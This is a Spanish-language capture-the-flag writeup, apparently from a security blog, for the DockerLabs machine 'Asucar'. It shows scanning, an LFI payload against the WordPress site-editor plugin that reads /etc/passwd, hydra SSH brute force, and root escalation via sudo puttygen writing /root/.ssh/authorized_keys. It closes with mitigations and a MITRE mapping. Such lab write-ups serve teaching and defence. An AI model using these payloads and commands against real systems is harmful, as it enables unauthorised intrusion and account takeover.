@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Asucar | ZsZsec</title>
+<meta content="Objetivo Ganar acceso al sistema identificando y explotando debilidades en una instalación de WordPress, para finalmente comprometer una cuenta de usuario en el sistema. Fase de re..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">DockerLabs</p>
+<h1>Maquina Asucar<span>_</span></h1>
+<div class="writeup-meta"><span>web / SUID / WordPress</span></div>
+<div class="tag-row"><span class="tag">web</span><span class="tag">SUID</span><span class="tag">WordPress</span><span class="tag">WPScan</span><span class="tag">Nmap</span><span class="tag">LFI</span><span class="tag">Site-editor</span><span class="tag">hydra</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h2>Objetivo</h2>
+<p>Ganar acceso al sistema identificando y explotando debilidades en una instalación de WordPress, para finalmente comprometer una cuenta de usuario en el sistema.</p>
+<h2>Fase de reconocimiento: Escaneo de puertos</h2>
+<p>Comenzamos con un escaneo completo de puertos utilizando <code>nmap</code>, con técnicas agresivas de detección de servicios:</p>
+<pre><code class="language-bash">zikuta㉿zikuta)-[~]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 172.17.0.2  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 16:37 CDT
+Nmap scan report for 172.17.0.2
+Host is up (0.000014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 64:44:10:ff:fe:17:28:06:93:11:e4:55:ea:93:3b:65 (ECDSA)
+|_  256 2d:aa:fb:08:58:aa:34:8d:4f:8a:71:b9:e4:b5:99:43 (ED25519)
+80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+|_http-title: Asucar Moreno
+|_http-generator: WordPress 6.5.3
+|_http-server-header: Apache/2.4.59 (Debian)
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p><strong>Parámetros clave:</strong></p>
+<ul>
+<li><code>-sS</code>: escaneo TCP SYN (rápido y sigiloso)</li>
+<li><code>-Pn</code>: omite ping; asume que el host está activo</li>
+<li><code>-p-</code>: escanea todos los 65535 puertos</li>
+<li><code>-sC</code>: utiliza scripts por defecto de NSE</li>
+<li><code>--min-rate 5000</code>: fuerza un escaneo rápido</li>
+</ul>
+<p><strong>Resultados</strong>:</p>
+<pre><code class="language-bash">22/tcp open  ssh     OpenSSH 9.2p1 Debian 80/tcp open  http    Apache/2.4.59 (Debian) con WordPress 6.5.3
+</code></pre>
+<p>La presencia del puerto 80 con un WordPress activo y el puerto 22 para SSH nos da dos vectores de ataque potenciales.</p>
+<h2>Enumeración web: <code>gobuster</code></h2>
+<p>Se utilizó <code>gobuster</code> para enumerar directorios ocultos en la aplicación web:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ gobuster dir -u http://172.17.0.2     -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,php,html,py -t 40
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2
+[+] Method:                  GET
+[+] Threads:                 40
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              txt,php,html,py
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.html                (Status: 403) [Size: 275]
+/.php                 (Status: 403) [Size: 275]
+/wp-content           (Status: 301) [Size: 313] [--&gt; http://172.17.0.2/wp-content/]                                                         
+/wordpress            (Status: 301) [Size: 312] [--&gt; http://172.17.0.2/wordpress/]                                                          
+/index.php            (Status: 301) [Size: 0] [--&gt; http://172.17.0.2/]
+/license.txt          (Status: 200) [Size: 19915]
+/wp-includes          (Status: 301) [Size: 314] [--&gt; http://172.17.0.2/wp-includes/]                                                        
+/wp-login.php         (Status: 200) [Size: 7464]
+/readme.html          (Status: 200) [Size: 7401]
+/wp-trackback.php     (Status: 200) [Size: 136]
+/wp-admin             (Status: 301) [Size: 311] [--&gt; http://172.17.0.2/wp-admin/]                                                           
+/xmlrpc.php           (Status: 405) [Size: 42]
+/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://asucar.dl/wp-login.php?action=register]                                           
+/.php                 (Status: 403) [Size: 275]
+/.html                (Status: 403) [Size: 275]
+/server-status        (Status: 403) [Size: 275]
+</code></pre>
+<p><strong>Directorios y archivos relevantes encontrados</strong>:</p>
+<pre><code class="language-bash">/wp-login.php       → página de login de WordPress
+/wp-content/        → carpeta de plugins/temas
+/wordpress/         → posible instalación duplicada o subdirectorio
+/license.txt        → confirma instalación WordPress
+/readme.html        → versión visible
+/xmlrpc.php         → podría permitir ataques automatizados
+</code></pre>
+<p>Esto confirma que estamos ante una instalación funcional de WordPress y abre la puerta a análisis más profundos.</p>
+<h2>Análisis específico de WordPress: <code>wpscan</code></h2>
+<p>Con la certeza de que WordPress está instalado, usamos <strong>WPScan</strong> para enumerar usuarios, plugins y detectar vulnerabilidades:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ wpscan wpscan --url http://asucar.dl --enumerate u,p,tt,cb,dbe --disable-tls-checks --plugins-detection mixed  
+
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://asucar.dl/ [172.17.0.2]
+[+] Started: Thu Jul 17 16:52:52 2025
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.59 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://asucar.dl/xmlrpc.php
+ | Found By: Link Tag (Passive Detection)
+ | Confidence: 100%
+ | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://asucar.dl/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://asucar.dl/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://asucar.dl/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://asucar.dl/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.5.3&lt;/generator&gt;
+ |  - http://asucar.dl/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.5.3&lt;/generator&gt;
+
+'Version: 1.1'
+
+[+] Enumerating Most Popular Plugins (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] site-editor
+ | Location: http://asucar.dl/wp-content/plugins/site-editor/
+ | Last Updated: 2017-05-02T23:34:00.000Z
+ | Readme: http://asucar.dl/wp-content/plugins/site-editor/readme.txt
+ | [!] The version is out of date, the latest version is 1.1.1
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://asucar.dl/wp-content/plugins/site-editor/readme.txt
+
+User(s) Identified:
+
+[+] wordpress
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://asucar.dl/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</code></pre>
+<p><strong>Hallazgos importantes</strong>:</p>
+<ul>
+<li><strong>Usuario encontrado</strong>: <code>wordpress</code></li>
+<li><strong>Plugin vulnerable</strong>: <code>site-editor</code>, versión <strong>1.1</strong> (última es 1.1.1)</li>
+<li>Este plugin tiene múltiples vulnerabilidades conocidas, incluyendo <strong>LFI (Local File Inclusion)</strong></li>
+</ul>
+<h2>Explotación: LFI en el plugin <code>site-editor</code></h2>
+<p>Investigando sobre el plugin, confirmamos que <strong>la versión 1.1.1</strong> contiene una vulnerabilidad <strong>LFI</strong> no autenticada:</p>
+<h4>Payload funcional</h4>
+<pre><code class="language-bash">http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/fefca116-4826-41f3-95bd-80e5c013d3f4"/></p>
+<p>Esto nos permite leer archivos arbitrarios del sistema. De hecho, el archivo <code>/etc/passwd</code> nos revela un usuario interesante:</p>
+<pre><code class="language-bash">curiosito:x:1000:1000:Curiosito:/home/curiosito:/bin/bash
+</code></pre>
+<h2>Ataque de fuerza bruta: acceso SSH</h2>
+<p>Con el nombre de usuario <code>curiosito</code>, se intentó un ataque de fuerza bruta vía SSH usando <code>hydra</code>:</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~]
+└─$ hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-17 17:12:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: curiosito   password: password1
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+<p><strong>Resultado exitoso</strong>:</p>
+<pre><code class="language-bash">[22][ssh] host: 172.17.0.2   login: curiosito   password: password1
+</code></pre>
+<h2>Acceso al sistema: SSH interactivo</h2>
+<p>Se establece una sesión interactiva SSH con:</p>
+<pre><code class="language-bash">                                                                   
+┌──(zikuta㉿zikuta)-[~]
+└─$ ssh curiosito@172.17.0.2
+curiosito@172.17.0.2's password: 
+Linux c63ee014a69b 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+curiosito@c63ee014a69b$
+</code></pre>
+<p>Confirmando acceso al sistema y completando la explotación.</p>
+<h1>Escalada de privilegios – Usuario <code>curiosito</code> a <code>root</code> usando <code>puttygen</code></h1>
+<p>Análisis de <code>sudo -l</code></p>
+<pre><code class="language-bash">curiosito@c63ee014a69b:~$ sudo -l
+Matching Defaults entries for curiosito on c63ee014a69b:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User curiosito may run the following commands on c63ee014a69b:
+    (root) NOPASSWD: /usr/bin/puttygen
+</code></pre>
+<p>Este resultado nos indica que el usuario <code>curiosito</code> <strong>puede ejecutar el binario <code>/usr/bin/puttygen</code> como root sin necesidad de contraseña</strong>.</p>
+<p><strong>puttygen</strong> es una herramienta para generar y convertir claves SSH, típicamente usada para convertir claves de formato OpenSSH a PuTTY (.ppk), o viceversa.</p>
+<p>Esto puede ser abusado para generar una <strong>clave pública controlada por nosotros</strong> y escribirla en <code>/root/.ssh/authorized_keys</code>, permitiéndonos conectarnos como <code>root</code> por SSH sin necesidad de contraseña.</p>
+<h2>Paso 1: Generar un par de claves SSH</h2>
+<p>Desde la cuenta de <code>curiosito</code>, generamos una nueva clave privada/pública:</p>
+<pre><code class="language-bash">curiosito@c63ee014a69b:~$ ssh-keygen -t rsa -b 2048 -f my_root_key
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in my_root_key
+Your public key has been saved in my_root_key.pub
+The key fingerprint is:
+</code></pre>
+<ul>
+<li><code>-t rsa</code>: tipo de clave RSA</li>
+<li><code>-b 2048</code>: tamaño de clave (2048 bits)</li>
+<li><code>-f my_root_key</code>: nombre del archivo de salida</li>
+</ul>
+<p>Esto produce:</p>
+<ul>
+<li><code>my_root_key</code> → clave <strong>privada</strong></li>
+<li><code>my_root_key.pub</code> → clave <strong>pública</strong></li>
+</ul>
+<blockquote>
+<p>Esta clave será usada para autenticarse como root, así que <strong>NO pongas passphrase</strong> cuando te lo pregunte.</p>
+</blockquote>
+<h2>Convertir la clave pública a formato OpenSSH con <code>puttygen</code> como root</h2>
+<pre><code class="language-bash">curiosito@c63ee014a69b:~$ sudo /usr/bin/puttygen my_root_key -O public-openssh -o my_root_key.pub
+</code></pre>
+<p>Aquí estamos usando <code>puttygen</code> como <strong>root</strong> para asegurarnos de que la clave está en el formato correcto (<code>public-openssh</code>), compatible con el archivo <code>authorized_keys</code>.</p>
+<h2>Crear el archivo <code>authorized_keys</code></h2>
+<p>Copiamos la clave pública a un archivo llamado <code>authorized_keys</code>:</p>
+<pre><code class="language-bash">curiosito@c63ee014a69b:~$ cp my_root_key.pub authorized_keys
+</code></pre>
+<p>Este archivo contiene la clave pública que el sistema usará para autenticarnos como root.</p>
+<h1>Usar <code>puttygen</code> con <code>sudo</code> para escribir en <code>/root/.ssh/authorized_keys</code></h1>
+<h3>Contexto</h3>
+<p>En sistemas Linux, el archivo:</p>
+<pre><code class="language-bash">/root/.ssh/authorized_keys
+</code></pre>
+<p>contiene las claves públicas autorizadas para conectarse al usuario <code>root</code> a través de <strong>autenticación por clave SSH</strong>. Si colocamos allí <strong>nuestra propia clave pública</strong>, podremos conectarnos como <code>root</code> sin contraseña (si el servicio SSH está activo y configurado para aceptar claves).</p>
+<p>Usamos <code>puttygen</code> nuevamente con permisos de root para sobrescribir el archivo <code>/root/.ssh/authorized_keys</code>:</p>
+<pre><code class="language-bash">curiosito@c63ee014a69b:~$ sudo /usr/bin/puttygen authorized_keys -O public-openssh -o /root/.ssh/authorized_keys
+</code></pre>
+<p>Aquí se está utilizando <code>puttygen</code> como root para escribir la clave pública <strong>en el home del usuario root</strong>, autorizando nuestra clave privada para conectarnos sin contraseña.</p>
+<blockquote>
+<p>Si el directorio <code>/root/.ssh</code> no existiera, también podrías crearlo (si tuvieras otros binarios habilitados en <code>sudo -l</code>, pero en este caso <code>puttygen</code> basta ya que escribe directamente).</p>
+</blockquote>
+<h3>Comando utilizado</h3>
+<table>
+<thead>
+<tr>
+<th>Comando completo</th>
+<th>Significado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo</code></td>
+<td>Ejecuta el comando como root (permitido por <code>sudo -l</code>)</td>
+</tr>
+<tr>
+<td><code>/usr/bin/puttygen</code></td>
+<td>Ruta completa del binario autorizado en <code>sudoers</code></td>
+</tr>
+<tr>
+<td><code>authorized_keys</code></td>
+<td>Archivo de entrada (en este caso, contiene nuestra clave pública en cualquier formato válido para puttygen)</td>
+</tr>
+<tr>
+<td><code>-O public-openssh</code></td>
+<td>Especifica el formato de salida: clave pública compatible con OpenSSH</td>
+</tr>
+<tr>
+<td><code>-o /root/.ssh/authorized_keys</code></td>
+<td>Archivo de salida. Estamos sobrescribiendo directamente el archivo de claves autorizadas del usuario root</td>
+</tr>
+</tbody>
+</table>
+<h3>¿Qué está pasando exactamente?</h3>
+<ol>
+<li><strong><code>puttygen</code> toma el contenido del archivo <code>authorized_keys</code> local</strong> (que nosotros llenamos previamente con nuestra propia clave pública).</li>
+<li>Lo convierte al <strong>formato OpenSSH público</strong>, necesario para funcionar  SSH (<code>sshd</code>).</li>
+<li>Lo <strong>escribe directamente en <code>/root/.ssh/authorized_keys</code></strong>, que es el archivo que SSH usa para validar si alguien tiene permitido autenticarse como <code>root</code> por clave pública.</li>
+<li>Como el comando se ejecuta con <code>sudo</code>, se <strong>escribe como root</strong>, lo que normalmente no podríamos hacer desde un usuario sin privilegios.</li>
+</ol>
+<h3>Comprobación</h3>
+<p>Después de ejecutar ese comando exitosamente, puedes hacer:</p>
+<pre><code class="language-bash">ssh -i my_root_key root@localhost`
+</code></pre>
+<p>Y tendrás acceso como <code>root</code> sin ingresar ninguna contraseña, gracias a que tu clave fue aceptada en <code>authorized_keys</code>.</p>
+<pre><code class="language-bash">curiosito@c63ee014a69b:~$ ssh -i my_root_key root@localhost
+The authenticity of host 'localhost (::1)' can't be established.
+ED25519 key fingerprint is SHA256:uxPuaJueTWTbzOOOgHR9jKEuKfQzpWt1rU8JihuRr4o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
+Linux c63ee014a69b 6.12.13-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.13-1kali1 (2025-02-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+root@c63ee014a69b:~# whoami
+root
+</code></pre>
+<h2>Tecnicas utilizadas y Mitigaciones</h2>
+<table>
+<thead>
+<tr>
+<th>Nº</th>
+<th>Técnica utilizada</th>
+<th>Herramienta</th>
+<th>Descripción</th>
+<th>Mitigación recomendada</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Escaneo de puertos</td>
+<td><code>nmap</code></td>
+<td>Descubrimiento de servicios abiertos (22/SSH, 80/HTTP)</td>
+<td>Configurar firewall (iptables/ufw), cerrar puertos innecesarios</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Enumeración de directorios web</td>
+<td><code>gobuster</code></td>
+<td>Fuerza bruta sobre rutas comunes, identificando instalación de WordPress</td>
+<td>Restringir acceso a rutas sensibles, aplicar control de acceso con <code>.htaccess</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Fingerprinting de WordPress</td>
+<td><code>wpscan</code></td>
+<td>Enumeración de usuarios, plugins, y detección de versiones desactualizadas</td>
+<td>Mantener WordPress y plugins actualizados, ocultar versión en encabezados HTTP</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Explotación de LFI en plugin vulnerable (<code>site-editor</code>)</td>
+<td>Navegador / curl</td>
+<td>Lectura de <code>/etc/passwd</code> vía parámetro vulnerable <code>ajax_path</code></td>
+<td>Eliminar o actualizar plugins obsoletos, aplicar WAF, deshabilitar error_reporting</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Fuerza bruta sobre SSH</td>
+<td><code>hydra</code></td>
+<td>Ataque por diccionario exitoso sobre usuario <code>curiosito</code></td>
+<td>Aplicar Fail2Ban, limitar intentos SSH, deshabilitar login por contraseña si es posible</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Escalada de privilegios con <code>sudo puttygen</code></td>
+<td><code>puttygen</code>, <code>ssh</code></td>
+<td>Generación y escritura de clave pública autorizada para root, acceso completo sin contraseña</td>
+<td>No permitir binarios como <code>puttygen</code>, <code>vim</code>, <code>cp</code>, etc. en sudo sin restricciones</td>
+</tr>
+</tbody>
+</table>
+<h3>Recomendaciones adicionales</h3>
+<ul>
+<li><strong>Auditar el archivo <code>/etc/sudoers</code></strong> regularmente para detectar comandos peligrosos sin restricciones.</li>
+<li><strong>Eliminar usuarios con contraseñas débiles o innecesarios</strong>.</li>
+<li><strong>Monitorear logs de autenticación (<code>/var/log/auth.log</code>)</strong> para detectar intentos de fuerza bruta.</li>
+<li><strong>Configurar correctamente permisos y propiedades de los archivos críticos</strong> como <code>/root/.ssh/authorized_keys</code>.</li>
+</ul>
+<h2>Conclusión final</h2>
+<p>Durante la resolución de la máquina <strong>Asucar</strong>, se llevó a cabo una cadena completa de ataque que comenzó con un reconocimiento activo de red y terminó con la obtención de privilegios de <strong>root</strong> mediante una mala configuración de <code>sudo</code>.</p>
+<p>Las fases del ataque incluyeron:</p>
+<ul>
+<li>Identificación de servicios vulnerables (WordPress con plugins obsoletos)</li>
+<li>Explotación de una vulnerabilidad de <strong>Local File Inclusion</strong> (LFI)</li>
+<li>Uso de diccionario para obtener acceso a un usuario válido (<code>curiosito</code>)</li>
+<li>Escalada de privilegios usando <code>puttygen</code> como <code>root</code> para inyectar una clave SSH personalizada en <code>/root/.ssh/authorized_keys</code></li>
+</ul>
+<p>Esta máquina demuestra cómo pequeñas malas prácticas (como dejar un plugin viejo o permitir binarios peligrosos en <code>sudo</code>) pueden llevar a la <strong>toma total del sistema</strong>.</p>
+<h2>MITRE ATT&amp;CK</h2>
+<table>
+<thead>
+<tr>
+<th>Fase MITRE</th>
+<th>Táctica (Tactic)</th>
+<th>Técnica (Technique)</th>
+<th>ID</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Descubrimiento</td>
+<td>Network Service Discovery</td>
+<td><strong>Network Service Scanning</strong></td>
+<td>T1046</td>
+<td>Se usó <code>nmap</code> para identificar servicios abiertos (puertos 22 y 80).</td>
+</tr>
+<tr>
+<td>Reconocimiento</td>
+<td>Active Scanning</td>
+<td><strong>Vulnerability Scanning / Directory Bruteforce</strong></td>
+<td>T1595.002</td>
+<td><code>gobuster</code> permitió descubrir rutas sensibles y confirmar WordPress.</td>
+</tr>
+<tr>
+<td>Reconocimiento</td>
+<td>Active Scanning</td>
+<td><strong>Service Version Detection</strong></td>
+<td>T1046</td>
+<td><code>nmap -sV</code> identificó versiones vulnerables de Apache y WordPress.</td>
+</tr>
+<tr>
+<td>Desarrollo inicial</td>
+<td>Exploit Public-Facing Application</td>
+<td><strong>Exploit Public-Facing Application</strong></td>
+<td>T1190</td>
+<td>Se explotó LFI en el plugin vulnerable <code>site-editor</code>.</td>
+</tr>
+<tr>
+<td>Credenciales</td>
+<td>Brute Force</td>
+<td><strong>Password Guessing</strong></td>
+<td>T1110.001</td>
+<td>Se realizó fuerza bruta con <code>hydra</code> sobre SSH hasta encontrar <code>password1</code>.</td>
+</tr>
+<tr>
+<td>Acceso inicial</td>
+<td>Valid Accounts</td>
+<td><strong>Valid Accounts: SSH</strong></td>
+<td>T1078.004</td>
+<td>Acceso mediante credenciales válidas (usuario <code>curiosito</code>).</td>
+</tr>
+<tr>
+<td>Escalada</td>
+<td>Abuse Elevation Control Mechanism</td>
+<td><strong>Sudo and Sudo Caching</strong></td>
+<td>T1548.003</td>
+<td>Uso de <code>sudo</code> para ejecutar <code>puttygen</code> como root.</td>
+</tr>
+<tr>
+<td>Persistencia</td>
+<td>SSH Authorized Keys</td>
+<td><strong>SSH Authorized Keys</strong></td>
+<td>T1098.004</td>
+<td>Se inyectó una clave en <code>/root/.ssh/authorized_keys</code>.</td>
+</tr>
+<tr>
+<td>Ejecución</td>
+<td>Command and Scripting Interpreter</td>
+<td><strong>SSH</strong></td>
+<td>T1059.004</td>
+<td>Uso de <code>ssh</code> para ejecutar comandos como root.</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
